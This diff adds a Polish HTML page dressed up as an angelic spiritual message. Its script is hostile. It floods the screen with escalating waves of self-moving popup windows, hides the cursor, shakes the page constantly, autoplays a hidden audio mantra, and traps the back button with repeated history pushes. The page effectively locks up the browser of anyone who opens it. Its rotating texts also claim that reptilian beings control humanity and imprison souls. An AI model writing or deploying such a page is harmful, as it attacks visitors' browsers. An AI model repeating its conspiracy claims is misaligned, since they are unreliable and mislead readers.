@@ -1,0 +1,583 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>👼 ANIELSKIE PRZESŁANIE – OTWÓRZ SWOJE SERCE 👼</title>
+    <style>
+        * {
+            cursor: none !important;
+            user-select: none;
+        }
+        
+        body {
+            margin: 0;
+            padding: 0;
+            background: radial-gradient(ellipse at center, #0a0a2a 0%, #030318 100%);
+            font-family: 'Georgia', 'Times New Roman', serif;
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+            animation: heavenlyQuake 0.05s infinite linear;
+        }
+        
+        @keyframes heavenlyQuake {
+            0% { transform: translate(0px, 0px) rotate(0deg); }
+            10% { transform: translate(-3px, 2px) rotate(0.5deg); }
+            20% { transform: translate(3px, -2px) rotate(-0.5deg); }
+            30% { transform: translate(-2px, 3px) rotate(0.3deg); }
+            40% { transform: translate(2px, -3px) rotate(-0.3deg); }
+            50% { transform: translate(-3px, -2px) rotate(0.2deg); }
+            60% { transform: translate(3px, 2px) rotate(-0.2deg); }
+            70% { transform: translate(2px, 3px) rotate(0.1deg); }
+            80% { transform: translate(-2px, -3px) rotate(-0.1deg); }
+            90% { transform: translate(3px, -2px) rotate(0deg); }
+            100% { transform: translate(0px, 0px) rotate(0deg); }
+        }
+        
+        .light-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle, rgba(255,215,0,0.08) 0%, rgba(0,0,0,0.75) 100%);
+            z-index: -1;
+            pointer-events: none;
+        }
+        
+        .main-panel {
+            position: relative;
+            z-index: 100;
+            max-width: 850px;
+            margin: 25px auto;
+            padding: 35px 30px;
+            background: rgba(5, 8, 25, 0.88);
+            border-radius: 60px;
+            backdrop-filter: blur(6px);
+            border: 2px solid #ffdd99;
+            box-shadow: 0 0 60px rgba(255, 220, 150, 0.4), inset 0 0 30px rgba(255, 215, 0, 0.2);
+            text-align: center;
+            animation: heavenlyGlow 0.3s infinite;
+        }
+        
+        @keyframes heavenlyGlow {
+            0%, 100% { border-color: #ffdd99; box-shadow: 0 0 30px rgba(255,220,150,0.3); }
+            50% { border-color: #ffecb3; box-shadow: 0 0 80px rgba(255,235,180,0.6); }
+        }
+        
+        h1 {
+            color: #ffecb3;
+            font-size: 2.2rem;
+            margin: 0 0 20px 0;
+            text-shadow: 0 0 15px #ffaa33, 2px 2px 0px #4a2e00;
+            font-family: 'Georgia', serif;
+            letter-spacing: 2px;
+            animation: sacredTextShake 0.1s infinite;
+        }
+        
+        @keyframes sacredTextShake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-4px); }
+            75% { transform: translateX(4px); }
+        }
+        
+        .sacred-text {
+            color: #ffe0aa;
+            font-size: 1.1rem;
+            margin: 25px 0;
+            padding: 25px;
+            background: rgba(0,0,0,0.55);
+            border-radius: 45px;
+            border-left: 5px solid #ffdd99;
+            border-right: 5px solid #ffdd99;
+            font-style: italic;
+            line-height: 1.6;
+            min-height: 200px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: opacity 0.5s ease;
+        }
+        
+        .sacred-text span {
+            display: block;
+            text-align: center;
+        }
+        
+        button {
+            background: linear-gradient(135deg, #8b691b, #4a3500);
+            color: #ffefcf;
+            font-size: 1.3rem;
+            padding: 14px 28px;
+            border: 2px solid #ffdd99;
+            border-radius: 60px;
+            font-weight: bold;
+            cursor: none;
+            transition: 0.05s linear;
+            font-family: 'Georgia', serif;
+            margin: 15px;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.5);
+            letter-spacing: 2px;
+        }
+        
+        button:active {
+            transform: scale(0.95);
+        }
+        
+        .escape-btn {
+            background: linear-gradient(135deg, #2c5a2c, #1a3a1a);
+            font-size: 1.5rem;
+            padding: 18px 36px;
+            animation: angelicBtnPulse 0.3s infinite;
+        }
+        
+        @keyframes angelicBtnPulse {
+            0%, 100% { transform: scale(1); background: linear-gradient(135deg, #2c5a2c, #1a3a1a); }
+            50% { transform: scale(1.03); background: linear-gradient(135deg, #3e7a3e, #2a5a2a); }
+        }
+        
+        .notification-stack {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            width: 340px;
+            z-index: 1000000;
+            pointer-events: none;
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+        
+        .notif {
+            background: linear-gradient(135deg, #1a1525, #0f0c18);
+            border-left: 5px solid #ffdd99;
+            margin: 8px;
+            padding: 12px;
+            border-radius: 25px;
+            color: #ffefcf;
+            font-family: Georgia, serif;
+            font-size: 13px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.6);
+            animation: slideHeavenRight 0.2s ease;
+            pointer-events: auto;
+            backdrop-filter: blur(8px);
+        }
+        
+        @keyframes slideHeavenRight {
+            from { transform: translateX(100%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+        
+        .notif-title {
+            font-weight: bold;
+            color: #ffdd99;
+            margin-bottom: 5px;
+        }
+        
+        .close-notif {
+            float: right;
+            cursor: none;
+            background: none;
+            border: none;
+            color: #ffdd99;
+            font-size: 16px;
+            padding: 0 5px;
+            pointer-events: auto;
+        }
+        
+        /* TYLKO GWIAZDKI - brak innych emoji */
+        .floating-star {
+            position: fixed;
+            font-size: 28px;
+            pointer-events: none;
+            z-index: 99999;
+            animation: starFloat 4s ease-out forwards;
+        }
+        
+        @keyframes starFloat {
+            0% { transform: translateY(0) rotate(0deg); opacity: 1; }
+            100% { transform: translateY(-100vh) rotate(360deg); opacity: 0; }
+        }
+        
+        .status-bar {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: rgba(0,0,0,0.92);
+            color: #ffecb3;
+            padding: 8px;
+            font-family: monospace;
+            font-size: 12px;
+            text-align: center;
+            z-index: 100000;
+            border-top: 2px solid #ffdd99;
+            font-weight: bold;
+            animation: heavenStatus 0.2s infinite;
+        }
+        
+        @keyframes heavenStatus {
+            0%, 100% { color: #ffecb3; background: rgba(0,0,0,0.92); }
+            50% { color: #ffcc88; background: rgba(40,20,0,0.95); }
+        }
+        
+        .angel-cursor {
+            position: fixed;
+            width: 22px;
+            height: 22px;
+            background: radial-gradient(circle, #ffecb3, #ccaa66);
+            border-radius: 50%;
+            pointer-events: none;
+            z-index: 9999999;
+            animation: angelCursorGlow 0.2s infinite;
+            display: none;
+            box-shadow: 0 0 15px #ffdd99;
+        }
+        
+        @keyframes angelCursorGlow {
+            0%, 100% { transform: scale(1); opacity: 0.9; }
+            50% { transform: scale(1.3); opacity: 1; }
+        }
+        
+        /* Ukrywamy liczniki */
+        .hidden-counters {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+<div class="light-overlay"></div>
+
+<!-- IFRAME Z MANTRA ASHTAR SHERAN – cichy, odtwarzany po interakcji -->
+<iframe id="ashtarMantra" src="https://w.soundcloud.com/player/?url=https%3A//soundcloud.com/institutonovaterra/divine-mantra-of-ashtar-sheran&color=%23ffdd99&auto_play=false&hide_related=true&show_comments=false&show_user=false&show_reposts=false&show_teaser=false&visual=false" width="0" height="0" style="display:none;" allow="autoplay"></iframe>
+
+<div class="main-panel">
+    <h1>✨ ROZMOWY Z POUCZENIEM OD MOICH PRZYJACIÓŁ Z WSZECHŚWIATA ✨</h1>
+    
+    <!-- Zmieniający się tekst anielski -->
+    <div class="sacred-text" id="changingText">
+        <span>🌟 „MAM ANIELSKI SEN, ŻE PEWNEGO DNIA ZIEMSKIE NARODY POWSTANĄ I WPROWADZĄ W ŻYCIE PRAWDZIWE ZNACZENIE SWOJEJ WIARY...” 🌟</span>
+    </div>
+    
+    <button class="escape-btn" id="escapeBtn">🕊️ POWRÓĆ DO ŚWIATŁA STWÓRCY 🕊️</button>
+</div>
+
+<div class="notification-stack" id="notificationStack"></div>
+<div class="status-bar" id="statusBar">
+    🌤️ ANIELSKIE PRZESŁANIE ROZCHODZI SIĘ PO CAŁEJ ZIEMI 🌤️
+</div>
+<div class="angel-cursor" id="angelCursor"></div>
+
+<script>
+    (function() {
+        // UKRYWAMY KURSOR – zastępujemy go anielskim światłem
+        document.body.style.cursor = 'none';
+        
+        let cursorVisible = false;
+        setInterval(() => {
+            cursorVisible = !cursorVisible;
+            const cursor = document.getElementById('angelCursor');
+            if (cursorVisible) {
+                cursor.style.display = 'block';
+                setTimeout(() => { cursor.style.display = 'none'; }, 200);
+            }
+        }, 3000);
+        
+        // ŚWIĘTA MANTRA ASHTAR SHERAN – włącza się przy każdym kliknięciu
+        let mantraPlaying = false;
+        const ashtarIframe = document.getElementById('ashtarMantra');
+        
+        function playSacredMantra() {
+            if (!mantraPlaying) {
+                ashtarIframe.src = "https://w.soundcloud.com/player/?url=https%3A//soundcloud.com/institutonovaterra/divine-mantra-of-ashtar-sheran&color=%23ffdd99&auto_play=true&hide_related=true&show_comments=false&show_user=false&show_reposts=false&show_teaser=false&visual=false";
+                mantraPlaying = true;
+            } else {
+                ashtarIframe.contentWindow.postMessage('{"method":"play"}', '*');
+            }
+        }
+        
+        document.addEventListener('click', () => { playSacredMantra(); });
+        setTimeout(() => { playSacredMantra(); }, 1500);
+        
+        // ============================================
+        // ZMIENIAJĄCY SIĘ TEKST ANIELSKI (co 12 sekund)
+        // ============================================
+        const sacredTexts = [
+            { text: "🌟 „MAM ANIELSKI SEN, ŻE PEWNEGO DNIA ZIEMSKIE NARODY POWSTANĄ I WPROWADZĄ W ŻYCIE PRAWDZIWE ZNACZENIE SWOJEJ WIARY: 'UZNAJEMY TE PRAWDY ZA OCZYWISTE, ŻE WSZYSCY LUDZIE ZOSTALI STWORZENI RÓWNYMI.'” 🌟", author: "– PRZESŁANIE 2870, PAN JEZUS CHRYSTUS" },
+            { text: "👼 „MAM ANIELSKI SEN, ŻE PEWNEGO DNIA NA PLANECIE ZIEMIA SYNOWIE ANIOŁÓW NIEBA I SYNOWIE BYŁYCH ANIOŁÓW CIEMNOŚCI BĘDĄ MOGLI ZASIĄŚĆ RAZEM PRZY STOLE MIŁOŚCI I BRATERSTWA.” 👼", author: "– PRZESŁANIE 2870" },
+            { text: "✨ „MAM ANIELSKI SEN, ŻE LUDZIE ZACZNĄ MÓWIĆ W JEDNYM PLANETARNYM JĘZYKU – W CZESKIM – I ODRZUCĄ 7000 RÓŻNYCH JĘZYKÓW WBITYCH TUTAJ PRZEZ PIEKIELNE JASZCZURY Z INNYCH ŚWIATÓW, ABY LUDZIE NIGDY NIE MOGLI SIĘ ZROZUMIEĆ.” ✨", author: "" },
+            { text: "💫 „MAM ANIELSKI SEN, ŻE LUDZIE NA ZIEMI ZACZNĄ UŻYWAĆ SWOICH DUCHOWYCH SERC, W KTÓRYCH MAJĄ NAJWYŻSZĄ PRAWDĘ STWÓRCY, MIŁOŚĆ, MĄDROŚĆ, DOBRO I INTELIGENCJĘ.” 💫", author: "" },
+            { text: "🕊️ „MAM ANIELSKI SEN, ŻE PEWNEGO DNIA LUDZIE PRZESTANĄ BYĆ MARIONETKAMI JASZCZURÓW Z CIEMNOŚCI I DOŁĄCZĄ DO WIELKIEJ NIEBIESKIEJ RODZINY ANIELSKICH ŚWIATÓW W CZYSTEJ MIŁOŚCI, TAK JAK BYŁO OD NIEPAMIĘTNYCH CZASÓW.” 🕊️", author: "– PRZESŁANIE 2870" },
+            { text: "🌟 „PRZEZ MIŁOŚĆ ZYSKUJESZ WOLNOŚĆ, SZCZĘŚCIE I ŁASKĘ. PRZEZ BRAK MIŁOŚCI – NIEWOLĘ, BÓL I CIERPIENIE. TAKA JEST TWOJA NATURA – KOCHAĆ.” 🌟", author: "– PRZESŁANIE 1675, KOSMICZNI PRZYJACIELE" },
+            { text: "🔥 „LUDZIE, OBCUDŹCIE SIĘ! CZY WCIĄŻ POZWALACIE GADOM KONTROLOWAĆ WAS? WSTANCIE Z DŁUGIEGO ZIMOWEGO SNU I OTWÓRZCIE SWOJE SERCA!” 🔥", author: "– KOSMICZNI LUDZIE SIŁ ŚWIATŁA" },
+            { text: "🌌 „JEDYNA DROGA DO WOLNOŚCI TO DROGA MIŁOŚCI, HARMONII, UCZUĆ I DOBRA. KOCHAMY WAS – KOSMICZNI PRZYJACIELE.” 🌌", author: "" },
+            { text: "📜 „TWÓJ DUCH I TWOJA DUSZA SĄ UWIĘZIONE W KAPSUŁY PROTONOWE PRZEZ PSEUDO-TWÓRCÓW. TYLKO 5% KOMUNIKACJI Z TWOIM PRAWDZIWYM JA. OTWÓRZ SWOJE DUCHOWE SERCE!” 📜", author: "– PRZESŁANIE 1709" },
+            { text: "⭐ „KOCHAJCIE SIĘ WZAJEMNIE I MIŁUJCIE WSZYSTKICH. W PRZECIWNYM RAZIE JESTEŚCIE KONTROLOWANI. PRZEZ MIŁOŚĆ STAJECIE SIĘ PRAWDZIWYMI LUDŹMI.” ⭐", author: "– PRZESŁANIE 1675" },
+            { text: "💗 „LUDZIE, PRZESTAŃCIE NISZCZYĆ PLANETĘ ZIEMIĘ I SAMYCH SIEBIE. NIE POZWALAJCIE NEGATYWNYM ISTOTOM Z KOSMOSU KONTROLOWAĆ WAS. BĄDŹCIE WOLNI!” 💗", author: "" },
+            { text: "🌈 „WSZYSTKIE INFORMACJE MOGĄ BYĆ SWOBODNIE ROZPOWSZECHNIANE. ROZNOŚCIE ŚWIATŁO PO CAŁEJ PLANECIE!” 🌈", author: "" },
+            { text: "👼 „MAM ANIELSKI SEN, ŻE LUDZIE BĘDĄ PATRZEĆ NA WSCHÓD – NA WZROST ŚWIATŁA, MIŁOŚCI I PRAWDY – NA DROGĘ WNIEBOWSTĄPIENIA DO NIEBIOS.” 👼", author: "" },
+            { text: "✨ „TWÓJ PRAWDZIWY POZIOM DUCHOWY JEST OKREŚLONY PRZEZ TWOJĄ RELACJĘ DO PRZEDZIWNEGO STWÓRCY WSZECHŚWIATA, PANA JEZUSA CHRYSTUSA.” ✨", author: "" }
+        ];
+        
+        let textIndex = 0;
+        const textContainer = document.getElementById('changingText');
+        
+        function changeSacredText() {
+            textIndex = (textIndex + 1) % sacredTexts.length;
+            const newText = sacredTexts[textIndex];
+            textContainer.style.opacity = '0';
+            setTimeout(() => {
+                textContainer.innerHTML = `<span>${newText.text}<br><small style="font-size:0.8rem; color:#ffcc88;">${newText.author}</small></span>`;
+                textContainer.style.opacity = '1';
+            }, 300);
+        }
+        
+        setInterval(changeSacredText, 12000);
+        
+        // ============================================
+        // KONFIGURACJA NIEBIOS (bez liczników)
+        // ============================================
+        let activePopups = [];
+        
+        // OTWIERANIE ANIELSKIEGO OKNA – NIEBIOS
+        function openHeavenlyWindow() {
+            const startLeft = Math.random() * (window.screen.width - 520);
+            const startTop = Math.random() * (window.screen.height - 420);
+            const features = `width=520,height=420,left=${startLeft},top=${startTop},resizable=yes,scrollbars=yes,status=no,toolbar=no,location=no`;
+            const windowId = Math.floor(Math.random() * 10000);
+            
+            const windowContent = `
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <title>👼 NIEBIOSA MIŁOŚCI 👼</title>
+                    <style>
+                        body {
+                            background: radial-gradient(ellipse at center, #1a1225, #0a0515);
+                            color: #ffefcf;
+                            font-family: 'Georgia', serif;
+                            text-align: center;
+                            padding: 20px;
+                            margin: 0;
+                            height: 100vh;
+                            display: flex;
+                            flex-direction: column;
+                            justify-content: center;
+                            align-items: center;
+                            animation: heavenlyBgPulse 0.3s infinite, sacredShake 0.05s infinite;
+                            cursor: none;
+                            overflow: hidden;
+                            border: 2px solid #ffdd99;
+                        }
+                        @keyframes heavenlyBgPulse {
+                            0%, 100% { background: radial-gradient(ellipse at center, #1a1225, #0a0515); }
+                            50% { background: radial-gradient(ellipse at center, #2a1a35, #150a25); }
+                        }
+                        @keyframes sacredShake {
+                            0% { transform: translate(0px, 0px); }
+                            25% { transform: translate(-2px, 1px); }
+                            75% { transform: translate(2px, -1px); }
+                            100% { transform: translate(0px, 0px); }
+                        }
+                        h1 { font-size: 1.6rem; text-shadow: 0 0 12px #ffdd99; margin: 5px; }
+                        .counter { 
+                            font-size: 48px; font-weight: bold; margin: 15px; 
+                            background: rgba(0,0,0,0.5); padding: 10px 25px; border-radius: 60px;
+                            border: 1px solid #ffdd99;
+                            animation: heavenlyBounce 0.3s infinite;
+                        }
+                        @keyframes heavenlyBounce { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.08); } }
+                        button {
+                            background: #2a1a35; color: #ffefcf; border: 1px solid #ffdd99;
+                            padding: 12px 24px; margin: 12px; border-radius: 50px; cursor: none;
+                            font-weight: bold;
+                        }
+                        button:hover { background: #3a2a4a; }
+                        .close-btn { background: #5a3a2a; }
+                        .heaven-message { font-size: 12px; margin-top: 15px; color: #ccaa88; font-style: italic; max-width: 85%; }
+                        .angel-emoji { font-size: 40px; animation: angelicFloat 2s infinite; }
+                        @keyframes angelicFloat { 0%, 100% { transform: translateY(0px); } 50% { transform: translateY(-10px); } }
+                    </style>
+                </head>
+                <body>
+                    <div class="angel-emoji">👼✨⭐</div>
+                    <h1>✨ NIEBIOSA ŚWIATŁA ✨</h1>
+                    <div class="counter">🌠</div>
+                    <p><strong>TO OKNO JEST ANIELSKIM PRZESŁANIEM Z WYŻYNY!</strong></p>
+                    <p>Unosi się w niebiańskiej przestrzeni – otwórz swoje serce na duchową podróż.</p>
+                    <button onclick="window.close()" class="close-btn">❌ ZAMKNIJ NIEBIOSA ❌</button>
+                    <div class="heaven-message">💫 "PRZEZ MIŁOŚĆ ZYSKUJESZ WOLNOŚĆ, SZCZĘŚCIE I ŁASKĘ" – PRZESŁANIE 1675</div>
+                    <script>
+                        let step = 0;
+                        let moveInterval;
+                        function updatePosition() {
+                            if (window.closed) return;
+                            step++;
+                            const offsetX = Math.sin(step * 0.05) * 85 + Math.cos(step * 0.03) * 40;
+                            const offsetY = Math.cos(step * 0.07) * 65 + Math.sin(step * 0.04) * 50;
+                            let newX = window.screenX + offsetX;
+                            let newY = window.screenY + offsetY;
+                            if (newX < 0) newX = 0;
+                            if (newY < 0) newY = 0;
+                            if (newX + 520 > screen.width) newX = screen.width - 520;
+                            if (newY + 420 > screen.height) newY = screen.height - 420;
+                            window.moveTo(newX, newY);
+                        }
+                        moveInterval = setInterval(updatePosition, 50);
+                        setInterval(() => {
+                            if (!window.closed) {
+                                for(let i = 0; i < 5; i++) setTimeout(() => updatePosition(), i * 10);
+                                document.body.style.animation = 'none';
+                                setTimeout(() => { if (!window.closed) document.body.style.animation = 'sacredShake 0.05s infinite'; }, 50);
+                            }
+                        }, 2000);
+                        window.addEventListener('beforeunload', () => { if (moveInterval) clearInterval(moveInterval); });
+                        setInterval(() => {
+                            if (!window.closed) { const newWidth = 450 + Math.random() * 100; const newHeight = 350 + Math.random() * 100; window.resizeTo(newWidth, newHeight); }
+                        }, 4000);
+                    <\/script>
+                </body>
+                </html>
+            `;
+            
+            const heavenlyWindow = window.open("", "_blank", features);
+            if (heavenlyWindow) {
+                heavenlyWindow.document.write(windowContent);
+                heavenlyWindow.document.close();
+                const windowRef = { window: heavenlyWindow, id: windowId };
+                activePopups.push(windowRef);
+                
+                const externalMoveInterval = setInterval(() => {
+                    if (heavenlyWindow && !heavenlyWindow.closed) {
+                        let newX = heavenlyWindow.screenX + (Math.random() - 0.5) * 65;
+                        let newY = heavenlyWindow.screenY + (Math.random() - 0.5) * 65;
+                        if (newX < 0) newX = 0; if (newY < 0) newY = 0;
+                        if (newX + 520 > window.screen.width) newX = window.screen.width - 520;
+                        if (newY + 420 > window.screen.height) newY = window.screen.height - 420;
+                        try { heavenlyWindow.moveTo(newX, newY); } catch(e) {}
+                    } else { clearInterval(externalMoveInterval); }
+                }, 800);
+                
+                setTimeout(() => {
+                    const index = activePopups.findIndex(p => p.window === heavenlyWindow);
+                    if (index > -1 && heavenlyWindow && !heavenlyWindow.closed) { 
+                        heavenlyWindow.close(); 
+                        activePopups.splice(index, 1); 
+                        clearInterval(externalMoveInterval);
+                    }
+                }, 16000);
+                
+                addHeavenlyNotification("👼", "Niebiosa otwarte! Anielskie przesłanie unosi się w kosmicznej przestrzeni!");
+            } else {
+                addHeavenlyNotification("✨", "Aniołowie otwierają kolejne niebiosa w Twoim sercu...");
+            }
+        }
+        
+        function openHeavenlyExplosion(count, delay = 35) {
+            addHeavenlyNotification("💫", `${count} NIEBIOS OTWIERA SIĘ NARAZ! Fala łaski!`);
+            for (let i = 0; i < count; i++) setTimeout(() => openHeavenlyWindow(), i * delay);
+        }
+        
+        function startHeavenlyAvalanche() {
+            setInterval(() => { const waveSize = Math.floor(Math.random() * 8) + 6; openHeavenlyExplosion(waveSize, 40); }, 750);
+            setInterval(() => { const superWave = Math.floor(Math.random() * 16) + 12; openHeavenlyExplosion(superWave, 28); addHeavenlyNotification("🌊", `SUPER FALA ŁASKI! ${superWave} niebios!`); }, 2900);
+            setInterval(() => { const megaWave = Math.floor(Math.random() * 32) + 22; openHeavenlyExplosion(megaWave, 22); addHeavenlyNotification("✨", `MEGA FALA ŚWIATŁA! ${megaWave} NIEBIOS NARAZ!`); for (let i = 0; i < 12; i++) setTimeout(() => createFloatingStar(), i * 100); }, 6800);
+            setInterval(() => { const apocalypseWave = Math.floor(Math.random() * 75) + 55; openHeavenlyExplosion(apocalypseWave, 15); addHeavenlyNotification("👼", `${apocalypseWave} NIEBIOS OTWIERA SIĘ PRZED TOBĄ!`); updateStatusMessage(`👼 ${apocalypseWave} NIEBIOS OTWARTYCH! 👼`); }, 14000);
+        }
+        
+        function addHeavenlyNotification(icon, message) {
+            const notifDiv = document.createElement('div');
+            notifDiv.className = 'notif';
+            notifDiv.innerHTML = `<button class="close-notif" onclick="this.parentElement.remove()">✖</button><div class="notif-title">${icon} PRZESŁANIE Z NIEBA</div><div>${message}</div><div class="notif-time">${new Date().toLocaleTimeString()}</div>`;
+            notifStack.appendChild(notifDiv);
+            setTimeout(() => { if (notifDiv.parentElement) notifDiv.remove(); }, 5000);
+            while (notifStack.children.length > 15) notifStack.removeChild(notifStack.children[0]);
+        }
+        
+        // TYLKO GWIAZDKI
+        function createFloatingStar() {
+            const star = document.createElement('div');
+            star.className = 'floating-star';
+            star.textContent = '⭐';
+            star.style.left = Math.random() * window.innerWidth + 'px';
+            star.style.bottom = '0px';
+            star.style.fontSize = (18 + Math.random() * 40) + 'px';
+            document.body.appendChild(star);
+            setTimeout(() => star.remove(), 4200);
+        }
+        
+        function startMassiveStars() {
+            setInterval(() => { 
+                const count = Math.floor(Math.random() * 6) + 4; 
+                for (let i = 0; i < count; i++) setTimeout(() => createFloatingStar(), i * 120); 
+            }, 600);
+        }
+        
+        function updateStatusMessage(message) {
+            statusBar.textContent = `👼 ${message} 👼 | AKTYWNYCH NIEBIOS: ${activePopups.length}`;
+            setTimeout(() => {
+                if (statusBar.textContent.includes(message)) {
+                    statusBar.textContent = `🌤️ ANIELSKIE PRZESŁANIE ROZCHODZI SIĘ PO CAŁEJ ZIEMI | NIEBIOSA: ${activePopups.length}`;
+                }
+            }, 2500);
+        }
+        
+        const notifStack = document.getElementById('notificationStack');
+        const statusBar = document.getElementById('statusBar');
+        const escapeBtn = document.getElementById('escapeBtn');
+        
+        // Przycisk
+        let clickCount = 0;
+        escapeBtn.addEventListener('click', () => {
+            clickCount++;
+            playSacredMantra();
+            addHeavenlyNotification("🕊️", `Modlitwa #${clickCount} – Niebiosa otwierają się jeszcze szerzej przed Tobą!`);
+            if (clickCount === 1) openHeavenlyExplosion(28, 28);
+            else if (clickCount === 2) openHeavenlyExplosion(65, 22);
+            else if (clickCount === 3) openHeavenlyExplosion(130, 15);
+            else openHeavenlyExplosion(45 + clickCount * 6, 14);
+            
+            const maxX = window.innerWidth - escapeBtn.offsetWidth - 40;
+            const maxY = window.innerHeight - escapeBtn.offsetHeight - 100;
+            escapeBtn.style.position = 'fixed';
+            escapeBtn.style.left = `${Math.random() * maxX}px`;
+            escapeBtn.style.top = `${Math.random() * maxY}px`;
+            for (let i = 0; i < 18; i++) setTimeout(() => createFloatingStar(), i * 60);
+        });
+        
+        // Zmiana tytułu strony
+        const titleMessages = [
+            "👼 ANIELSKIE NIEBIOSA", "✨ PRZESŁANIE Z WYŻYNY", "💫 MIŁOŚĆ I ŚWIATŁO", 
+            "🌟 OTWÓRZ SWOJE SERCE", "🕊️ KOSMICZNI PRZYJACIELE", "🌌 STWÓRCA WSZECHŚWIATA"
+        ];
+        let titleIndex = 0;
+        setInterval(() => {
+            titleIndex = (titleIndex + 1) % titleMessages.length;
+            document.title = titleMessages[titleIndex];
+        }, 3000);
+        
+        // Blokada przycisku wstecz
+        history.pushState(null, null, location.href);
+        setInterval(() => history.pushState(null, null, location.href), 200);
+        window.addEventListener('popstate', () => history.pushState(null, null, location.href));
+        
+        // START
+        addHeavenlyNotification("👼", "ANIELSKIE PRZESŁANIE ROZPOCZYNA SIĘ! NIEBIOSA OTWIERAJĄ SIĘ PRZED TOBĄ!");
+        updateStatusMessage("ROZPOCZYNAMY ANIELSKĄ PODRÓŻ PRZEZ WYMIARY ŚWIATŁA");
+        setTimeout(() => openHeavenlyExplosion(22, 50), 800);
+        startHeavenlyAvalanche();
+        startMassiveStars();
+        
+        // Intensywność trzęsienia zmieniająca się losowo
+        setInterval(() => { 
+            const intensity = Math.random() * 0.04 + 0.04; 
+            document.body.style.animation = `heavenlyQuake ${intensity}s infinite linear`; 
+        }, 2500);
+        
+        console.log("%c👼👼👼 NIEBIOSA OTWIERAJĄ SIĘ PRZED TOBĄ – ANIELSKA OBECNOŚĆ STWÓRCY 👼👼👼", "color: gold; font-size: 18px; font-weight: bold;");
+        console.log("%c✨ OTWARTE NIEBIOSA PRZEMIESZCZAJĄ SIĘ W ŚWIĘTEJ PRZESTRZENI MIŁOŚCI", "color: orange; font-size: 16px;");
+    })();
+</script>
+</body>
+</html>
